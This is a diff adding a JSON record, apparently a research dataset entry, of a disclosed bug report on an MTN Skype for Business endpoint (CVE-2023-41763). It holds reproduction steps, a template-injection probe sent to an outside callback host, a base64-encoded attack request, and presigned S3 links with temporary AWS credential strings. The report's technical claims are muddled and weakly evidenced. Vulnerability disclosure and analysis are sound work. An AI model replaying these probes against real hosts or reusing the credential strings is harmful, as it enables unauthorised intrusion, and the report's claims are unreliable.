@@ -1,0 +1,56 @@
+{
+  "reported_to": "MTN Group",
+  "reported_by": "h0w ",
+  "title": "CVE-2023-41763 Business Elevation of Privilege vulnerability on [.mtn.com]",
+  "content": "\nSummary:\nThe Microsoft Skype for Business installation on the remote host is missing security updates. the flaw was actively exploited. Attackers could access some sensitive information but not alter or restrict access to it. The impact relates primarily to confidentiality. It is, therefore, affected by multiple vulnerabilities:\nAn elevation of privilege vulnerability. An attacker can exploit this to gain elevated privileges. (CVE-2023-41763)\nA remote code execution vulnerability. An attacker can exploit this to bypass authentication and execute unauthorized arbitrary commands. (CVE-2023-36780, CVE-2023-36786, CVE-2023-36789)\nSteps To Reproduce:\nNavigate visit https://fec-feweb-ext.mtn.com/lwa/Webpages/LwaClient.aspx\nIntercept request to burp-suite and send to repeater\nAdded parameter-vulnerable is lwa/Webpages/LwaClient.aspx?meeturl= I found this use recon\nUsed base64 encode to add payloads template-injection LMN%{1337*1337}#.xx\nCode 61 Bytes\n1http://attacker-payload-interact.sh/?id=LMN%{1337*1337}#.xx//\nSent request again, and boom This server has vulnerable:\nHere's the HTTP Parameter request that the issue:\nCode 438 Bytes\n1GET /lwa/Webpages/LwaClient.aspx?meeturl=aHR0cDovL2NtZDRjdm5laTU2Z3U5ZXRnMjIwb3AxaGI3ZWV3eDZjdS5vYXN0LmZ1bi8/aWQ9TE1OJTI1ezEzMzcqMTMzN30jLnh4Ly8= HTTP/1.1\n2Host: fec-feweb-ext.mtn.com\n3Sec-Ch-Ua: \n4Sec-Ch-Ua-Mobile: ?0\n5Sec-Ch-Ua-Platform: \"\"\n6Upgrade-Insecure-Requests: 1\n7Sec-Fetch-Site: none\n8Sec-Fetch-Mode: navigate\n9Sec-Fetch-User: ?1\n10Sec-Fetch-Dest: document\n11Accept-Encoding: gzip, deflate\n12Accept-Language: en-US,en;q=0.9\n13Connection: close\nCode 38 Bytes\n1HTTP/1.1 200 OK\n2Cache-Control: private\nSupporting Material/References:\nMicrosoft has released KB5032429 to address this issue.\n<image_0>\n<image_1>\nImpact\nThe Elevation of Privilege vulnerability, CVE-2023-41763, posed a significant security risk because it allowed attackers to potentially breach internet perimeters by exploiting Skype for Business. While the vulnerability primarily affected confidentiality, it could have led to the exposure of sensitive information that in turn might provide access to internal networks.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pa2aba13qvysz6xufyg0njjjrbgw?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTQHMCY4U%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T200326Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBdljid9%2FjPiHNvetcd5u6U2JtN5QM0tYTFMhgJeHY%2BSAiEA0l0FrkuiyBiOi8hmQNTVHjzB3bRpCgFTgFgdvCrOwckqugUI9P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDECCTHzi0QvvNwzRIiqOBW%2BGS6%2FPl0KnzrPxR1VEqClXwsegujBB8YT7gS4pNC7TS7MJylYtt3BuvQh9cC04mDHCXBSKtmjHtZvU4NMZRcxFgQ6t1C5SuWFGRG%2FW39%2FfsYxwj3eHPnvupdyLY8aWAvbXKxJ%2FUsznyNO9g7xzwah6wLnuD9EWdzmRdNgL87H5QvoQxx3TrpDMVs4CteP2BEZrsrtTW6QMOVJeYAbi46qtX1Uppmx6Bax4tbLm%2F04PhXOIGS0FXDpxJSuVr%2B%2FYxO7dIHCmWjn53PhA5PkbKsOZlx3LNA7j%2Fr8HqWetHA8JVPSbRnBfHs2pEavZQj19rpNYMDlgNwD9QAB72AB4lLXAhffTHtP4lnu%2BPUNah1BtvJAHbWr6t0kEXctEzxSDTJvshT5%2BNSdHbB6PN6NBqCXg85VZfHNt0klKbaWSwTpl6hvMCCWT%2Fb%2Bz5WP5bcx8O9OGd8yIk1jEYa5AkGAg3GWbMMcqxFTgFqHmjyoswwO1OKgM0LzV0haFfE%2Bov2Um%2FvquxKr9yVhw8DF2x89ZJfea68iOlbyr73cYz0E51pHY6wUPypqr91SKCpPIE383Dtu6kTR4ObVWAZYyIU6CQzafIdnfCboWM6Bc52kdOCaq8rcvfy2U%2F%2Bgkq2ERhBEEFVq7nrgtkErGPEFjSpshMu3gHNvQ3uuiiVdsJu1OyQMz8KafWtmU5q4InDLy8k9ERJbo0dKvEYwcoL0nG%2FgSUPS4Imvi2iJ4vH5WIp7sGDyOoxEIHrnLKAD8HucXp50GxcGpk4eGflhew82vrj3oG3fFNsJ9Qo52%2B7qHgrnk%2FLH4hQMOhp%2FN0zahKIFhXW%2BwjD4tdNH8UENaDq4RXTSpNChdhMKvk6Ux0jhvM98YHzDTyoa%2FBjqxAQnlYZblV25Gd5lfDW129Uylz%2FRYWFsgGrZpC%2BLsdBiqvft%2B7utnYcLFqkL8AMPy7hrXSsWRIs4EIGpR8gCBstTKNl6oKOMLwX6QX9wH7CsoWfXwteR1jcJWx%2FSse5nein5hq2y4bNOj%2BmLEB%2Fb%2Bgy0sg4vXgMQZAuDnrFmxnRUjSHpTEusAdkg19HKX%2Fm%2B75k%2BuncpmIQiA4vh2XdJmVzgR9%2F0r3hmbq6L4aFkvStwcvQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b5770c603a8d31aea82b2dff40c86c513d5635e6db7c51ae3a82aebb24e41a0e",
+    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3nnisk2atinfjwtnvljguey42fly?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTQHMCY4U%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T200326Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBdljid9%2FjPiHNvetcd5u6U2JtN5QM0tYTFMhgJeHY%2BSAiEA0l0FrkuiyBiOi8hmQNTVHjzB3bRpCgFTgFgdvCrOwckqugUI9P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDECCTHzi0QvvNwzRIiqOBW%2BGS6%2FPl0KnzrPxR1VEqClXwsegujBB8YT7gS4pNC7TS7MJylYtt3BuvQh9cC04mDHCXBSKtmjHtZvU4NMZRcxFgQ6t1C5SuWFGRG%2FW39%2FfsYxwj3eHPnvupdyLY8aWAvbXKxJ%2FUsznyNO9g7xzwah6wLnuD9EWdzmRdNgL87H5QvoQxx3TrpDMVs4CteP2BEZrsrtTW6QMOVJeYAbi46qtX1Uppmx6Bax4tbLm%2F04PhXOIGS0FXDpxJSuVr%2B%2FYxO7dIHCmWjn53PhA5PkbKsOZlx3LNA7j%2Fr8HqWetHA8JVPSbRnBfHs2pEavZQj19rpNYMDlgNwD9QAB72AB4lLXAhffTHtP4lnu%2BPUNah1BtvJAHbWr6t0kEXctEzxSDTJvshT5%2BNSdHbB6PN6NBqCXg85VZfHNt0klKbaWSwTpl6hvMCCWT%2Fb%2Bz5WP5bcx8O9OGd8yIk1jEYa5AkGAg3GWbMMcqxFTgFqHmjyoswwO1OKgM0LzV0haFfE%2Bov2Um%2FvquxKr9yVhw8DF2x89ZJfea68iOlbyr73cYz0E51pHY6wUPypqr91SKCpPIE383Dtu6kTR4ObVWAZYyIU6CQzafIdnfCboWM6Bc52kdOCaq8rcvfy2U%2F%2Bgkq2ERhBEEFVq7nrgtkErGPEFjSpshMu3gHNvQ3uuiiVdsJu1OyQMz8KafWtmU5q4InDLy8k9ERJbo0dKvEYwcoL0nG%2FgSUPS4Imvi2iJ4vH5WIp7sGDyOoxEIHrnLKAD8HucXp50GxcGpk4eGflhew82vrj3oG3fFNsJ9Qo52%2B7qHgrnk%2FLH4hQMOhp%2FN0zahKIFhXW%2BwjD4tdNH8UENaDq4RXTSpNChdhMKvk6Ux0jhvM98YHzDTyoa%2FBjqxAQnlYZblV25Gd5lfDW129Uylz%2FRYWFsgGrZpC%2BLsdBiqvft%2B7utnYcLFqkL8AMPy7hrXSsWRIs4EIGpR8gCBstTKNl6oKOMLwX6QX9wH7CsoWfXwteR1jcJWx%2FSse5nein5hq2y4bNOj%2BmLEB%2Fb%2Bgy0sg4vXgMQZAuDnrFmxnRUjSHpTEusAdkg19HKX%2Fm%2B75k%2BuncpmIQiA4vh2XdJmVzgR9%2F0r3hmbq6L4aFkvStwcvQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=13c8cd5736f3e1a25d68d11ead84877e8dc5544dec6914e0db28c5da157dbd37"
+  },
+  "disclosed_date": 1740257340,
+  "report_url": "https://hackerone.com/reports/2309291",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Navigate to https://fec-feweb-ext.mtn.com/lwa/Webpages/LwaClient.aspx"
+    ],
+    [
+      2,
+      "Intercept the request using Burp Suite and send it to the repeater"
+    ],
+    [
+      3,
+      "Add the parameter 'meeturl=' with a base64 encoded payload: LMN%{1337*1337}#.xx"
+    ],
+    [
+      4,
+      "Send the modified request to observe the server's vulnerable response"
+    ]
+  ],
+  "vuln_description": "The vulnerability is an elevation of privilege issue in Microsoft Skype for Business, where an attacker can exploit missing security updates to gain elevated privileges and potentially access sensitive information. The attack involves injecting a malicious payload through a parameter in a web request, which the server processes insecurely.",
+  "reason": "The attack involves a straightforward injection of a payload through a parameter, which is a common technique. The complexity is low because it does not require understanding complex application states or novel logic, and the steps to reproduce are clear and simple.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an elevation of privilege and remote code execution in Microsoft Skype for Business, which is detected by intercepting and manipulating HTTP requests with specific parameters. This aligns with the methodology of testing (user_session, action, resource_id) tuples by swapping parameters and observing unauthorized access or execution.",
+    "is_detectable": true
+  }
+}
